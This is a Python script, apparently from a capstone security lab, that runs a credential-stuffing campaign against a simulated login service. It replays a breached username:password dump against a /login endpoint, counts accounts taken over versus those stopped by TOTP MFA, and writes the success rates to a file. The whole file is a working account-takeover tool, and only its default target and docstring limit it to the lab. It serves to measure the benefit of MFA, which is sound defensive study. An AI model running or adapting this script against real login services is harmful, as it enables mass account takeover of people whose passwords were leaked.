#!/usr/bin/env python3
"""
Credential-stuffing / account-takeover campaign against StakeLine.

Replays a breached credential dump against the /login endpoint and records the
outcome of every attempt. Against the BASELINE build a valid reused password is
enough to take over an account; against the ENHANCED build the same valid
password is stopped at the TOTP second factor (the server answers
"mfa_required" and the attacker has no code), so takeovers collapse.

Usage:
    python credential_stuffing.py --target http://localhost:8080 \
        --dump ../data/breach_dump.txt --attempts 10000

Metrics written to ../data/credential_results.json:
    attempts, compromised, blocked_by_mfa, rejected, success_rate

This mirrors the capstone result: ~30% takeover at baseline, ~2% with MFA.
Authorised lab use only — runs against the local simulated target.
"""

import argparse
import itertools
import json
import time
from pathlib import Path

import requests

DATA = Path(__file__).resolve().parent.parent / "data"


def load_dump(path, attempts):
    """Yield (user, password) pairs, cycling the dump up to `attempts` times."""
    with open(path) as fh:
        pairs = [line.strip().split(":", 1) for line in fh if ":" in line]
    for i, (user, pw) in zip(range(attempts), itertools.cycle(pairs)):
        yield user, pw


def run(target, dump, attempts):
    stats = {"attempts": 0, "compromised": 0, "blocked_by_mfa": 0, "rejected": 0}
    session = requests.Session()
    started = time.time()

    for user, password in load_dump(dump, attempts):
        stats["attempts"] += 1
        try:
            r = session.post(f"{target}/login",
                             data={"user": user, "pass": password}, timeout=5)
            body = r.json()
        except (requests.RequestException, ValueError):
            stats["rejected"] += 1
            continue

        status = body.get("status")
        if status == "ok":
            stats["compromised"] += 1          # baseline: full takeover
        elif status == "mfa_required":
            stats["blocked_by_mfa"] += 1       # valid password, stopped at 2FA
        else:
            stats["rejected"] += 1             # bad_credentials / dead entry

        if stats["attempts"] % 1000 == 0:
            print(f"  {stats['attempts']:>6} attempts  "
                  f"hits={stats['compromised']}  mfa_blocked={stats['blocked_by_mfa']}")

    elapsed = time.time() - started
    stats["success_rate"] = round(stats["compromised"] / max(stats["attempts"], 1) * 100, 2)
    stats["elapsed_sec"] = round(elapsed, 1)

    DATA.mkdir(parents=True, exist_ok=True)
    with (DATA / "credential_results.json").open("w") as fh:
        json.dump(stats, fh, indent=2)

    print("\n=== credential-stuffing campaign complete ===")
    print(json.dumps(stats, indent=2))
    if stats["compromised"]:
        print(f"[!] {stats['compromised']} accounts compromised "
              f"({stats['success_rate']}%) — no second factor stopped them.")
    else:
        print(f"[✓] 0 takeovers — MFA blocked {stats['blocked_by_mfa']} valid-password attempts.")
    return stats


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://localhost:8080")
    ap.add_argument("--dump", default=str(DATA / "breach_dump.txt"))
    ap.add_argument("--attempts", type=int, default=10000)
    args = ap.parse_args()
    run(args.target, args.dump, args.attempts)
